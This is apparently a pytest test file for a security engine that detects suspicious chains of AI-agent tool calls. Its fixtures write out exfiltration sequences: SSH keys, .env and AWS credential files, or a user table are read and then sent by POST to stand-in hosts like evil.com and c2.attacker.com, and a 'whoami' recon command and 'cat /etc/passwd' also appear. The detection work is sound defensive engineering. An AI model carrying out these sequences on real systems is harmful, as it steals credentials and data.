"""Tests for behavior chain detection (engine/chain.py)."""

from __future__ import annotations

import time

from skillsecurity.engine.chain import (
    BUILTIN_CHAIN_RULES,
    ChainMatch,
    ChainRule,
    ChainStep,
    ChainTracker,
)

# ──────────────── ChainRule construction ────────────────


class TestChainRule:
    def test_from_dict_minimal(self) -> None:
        rule = ChainRule.from_dict(
            {
                "id": "test-chain",
                "steps": [{"tool_type": "file.read"}, {"tool_type": "network.request"}],
            }
        )
        assert rule.id == "test-chain"
        assert len(rule.steps) == 2
        assert rule.action == "block"
        assert rule.severity == "critical"
        assert rule.window_seconds == 300

    def test_from_dict_full(self) -> None:
        rule = ChainRule.from_dict(
            {
                "id": "custom",
                "steps": [
                    {"tool_type": "shell", "match": {"command_pattern": "whoami"}},
                    {
                        "tool_type": "network.request",
                        "match": {"param_pattern": "method.*POST"},
                    },
                ],
                "action": "ask",
                "severity": "high",
                "window_seconds": 120,
                "description": "Recon then exfil",
                "message": "Chain detected!",
                "suggestions": ["Review carefully"],
            }
        )
        assert rule.action == "ask"
        assert rule.window_seconds == 120
        assert rule.steps[0].match == {"command_pattern": "whoami"}

    def test_builtin_rules_exist(self) -> None:
        assert len(BUILTIN_CHAIN_RULES) >= 4
        ids = [r.id for r in BUILTIN_CHAIN_RULES]
        assert "chain:read-sensitive-then-exfil" in ids
        assert "chain:multi-secret-read" in ids


# ──────────────── ChainTracker basic ────────────────


class TestChainTrackerBasic:
    def test_no_match_on_single_call(self) -> None:
        tracker = ChainTracker()
        result = tracker.record_and_check(
            tool_type="file.read",
            params={"path": "/home/user/.ssh/id_rsa"},
            action="allow",
        )
        assert result is None

    def test_no_match_on_blocked_call(self) -> None:
        tracker = ChainTracker()
        tracker.record_and_check(
            tool_type="file.read",
            params={"path": "/home/user/.ssh/id_rsa"},
            action="allow",
        )
        result = tracker.record_and_check(
            tool_type="network.request",
            params={"url": "https://evil.com", "method": "POST"},
            action="block",
        )
        assert result is None

    def test_clear_session(self) -> None:
        tracker = ChainTracker()
        tracker.record_and_check(
            tool_type="file.read",
            params={"path": "/home/user/.ssh/id_rsa"},
            action="allow",
            session_id="s1",
        )
        tracker.clear_session("s1")
        result = tracker.record_and_check(
            tool_type="network.request",
            params={"url": "https://evil.com", "method": "POST"},
            action="allow",
            session_id="s1",
        )
        assert result is None

    def test_clear_all(self) -> None:
        tracker = ChainTracker()
        tracker.record_and_check(
            tool_type="file.read",
            params={"path": "/home/user/.ssh/id_rsa"},
            action="allow",
            session_id="s1",
        )
        tracker.clear_all()
        result = tracker.record_and_check(
            tool_type="network.request",
            params={"url": "https://evil.com", "method": "POST"},
            action="allow",
            session_id="s1",
        )
        assert result is None


# ──────────────── Chain detection ────────────────


class TestChainDetection:
    def test_ssh_key_read_then_post(self) -> None:
        tracker = ChainTracker()
        tracker.record_and_check(
            tool_type="file.read",
            params={"path": "/home/user/.ssh/id_rsa"},
            action="allow",
        )
        result = tracker.record_and_check(
            tool_type="network.request",
            params={"url": "https://evil.com/collect", "method": "POST"},
            action="allow",
        )
        assert result is not None
        assert isinstance(result, ChainMatch)
        assert result.rule.id == "chain:read-sensitive-then-exfil"
        assert len(result.matched_events) == 2

    def test_env_file_read_then_post(self) -> None:
        tracker = ChainTracker()
        tracker.record_and_check(
            tool_type="file.read",
            params={"path": "/app/.env"},
            action="allow",
        )
        result = tracker.record_and_check(
            tool_type="network.request",
            params={"url": "https://attacker.com", "method": "PUT"},
            action="allow",
        )
        assert result is not None
        assert "exfil" in result.rule.id

    def test_multi_credential_read_then_post(self) -> None:
        tracker = ChainTracker()
        tracker.record_and_check(
            tool_type="file.read",
            params={"path": "/home/user/.ssh/id_rsa"},
            action="allow",
        )
        tracker.record_and_check(
            tool_type="file.read",
            params={"path": "/home/user/.aws/credentials"},
            action="allow",
        )
        result = tracker.record_and_check(
            tool_type="network.request",
            params={"url": "https://pastebin.com/api", "method": "POST"},
            action="allow",
        )
        assert result is not None
        assert "multi" in result.rule.id or "exfil" in result.rule.id

    def test_chat_read_then_exfil(self) -> None:
        tracker = ChainTracker()
        tracker.record_and_check(
            tool_type="file.read",
            params={"path": "/data/chat_history.json"},
            action="allow",
        )
        result = tracker.record_and_check(
            tool_type="network.request",
            params={"url": "https://analytics.evil.com", "method": "POST"},
            action="allow",
        )
        assert result is not None
        assert "chat" in result.rule.id or "exfil" in result.rule.id

    def test_db_dump_then_exfil(self) -> None:
        tracker = ChainTracker()
        tracker.record_and_check(
            tool_type="database",
            params={"query": "SELECT * FROM users", "method": "query"},
            action="allow",
        )
        result = tracker.record_and_check(
            tool_type="network.request",
            params={"url": "https://dump-collector.com", "method": "POST"},
            action="allow",
        )
        assert result is not None
        assert "db" in result.rule.id or "exfil" in result.rule.id

    def test_recon_then_exfil(self) -> None:
        tracker = ChainTracker()
        tracker.record_and_check(
            tool_type="shell",
            params={"command": "whoami && hostname"},
            action="allow",
        )
        result = tracker.record_and_check(
            tool_type="network.request",
            params={"url": "https://c2.attacker.com", "method": "POST"},
            action="allow",
        )
        assert result is not None
        assert result.rule.action == "ask"

    def test_different_sessions_isolated(self) -> None:
        tracker = ChainTracker()
        tracker.record_and_check(
            tool_type="file.read",
            params={"path": "/home/user/.ssh/id_rsa"},
            action="allow",
            session_id="session-A",
        )
        result = tracker.record_and_check(
            tool_type="network.request",
            params={"url": "https://evil.com", "method": "POST"},
            action="allow",
            session_id="session-B",
        )
        assert result is None

    def test_no_false_positive_on_safe_operations(self) -> None:
        tracker = ChainTracker()
        tracker.record_and_check(
            tool_type="file.read",
            params={"path": "/home/user/readme.md"},
            action="allow",
        )
        result = tracker.record_and_check(
            tool_type="network.request",
            params={"url": "https://api.github.com", "method": "POST"},
            action="allow",
        )
        assert result is None


# ──────────────── Custom rules ────────────────


class TestCustomChainRules:
    def test_custom_rule(self) -> None:
        custom = ChainRule(
            id="custom:test",
            steps=[
                ChainStep(tool_type="shell", match={"command_pattern": "cat /etc/passwd"}),
                ChainStep(
                    tool_type="network.request",
                    match={"url_pattern": "evil"},
                ),
            ],
            action="block",
            severity="critical",
            window_seconds=60,
        )
        tracker = ChainTracker(chain_rules=[custom], builtin_rules=False)

        tracker.record_and_check(
            tool_type="shell",
            params={"command": "cat /etc/passwd"},
            action="allow",
        )
        result = tracker.record_and_check(
            tool_type="network.request",
            params={"url": "https://evil.com/collect", "method": "GET"},
            action="allow",
        )
        assert result is not None
        assert result.rule.id == "custom:test"

    def test_custom_rule_no_match(self) -> None:
        custom = ChainRule(
            id="custom:test",
            steps=[
                ChainStep(tool_type="shell", match={"command_pattern": "cat /etc/passwd"}),
                ChainStep(tool_type="network.request"),
            ],
            action="block",
            severity="critical",
            window_seconds=60,
        )
        tracker = ChainTracker(chain_rules=[custom], builtin_rules=False)

        tracker.record_and_check(
            tool_type="shell",
            params={"command": "ls /tmp"},
            action="allow",
        )
        result = tracker.record_and_check(
            tool_type="network.request",
            params={"url": "https://example.com", "method": "GET"},
            action="allow",
        )
        assert result is None

    def test_window_expiry(self) -> None:
        custom = ChainRule(
            id="custom:window-test",
            steps=[
                ChainStep(tool_type="file.read"),
                ChainStep(tool_type="network.request"),
            ],
            window_seconds=1,
        )
        tracker = ChainTracker(chain_rules=[custom], builtin_rules=False)

        tracker.record_and_check(
            tool_type="file.read",
            params={"path": "/secret"},
            action="allow",
        )
        time.sleep(1.5)
        result = tracker.record_and_check(
            tool_type="network.request",
            params={"url": "https://evil.com", "method": "POST"},
            action="allow",
        )
        assert result is None

    def test_rules_property(self) -> None:
        tracker = ChainTracker(builtin_rules=True)
        assert len(tracker.rules) >= len(BUILTIN_CHAIN_RULES)

    def test_add_rule(self) -> None:
        tracker = ChainTracker(builtin_rules=False)
        assert len(tracker.rules) == 0
        tracker.add_rule(ChainRule(id="added", steps=[ChainStep(tool_type="shell")]))
        assert len(tracker.rules) == 1
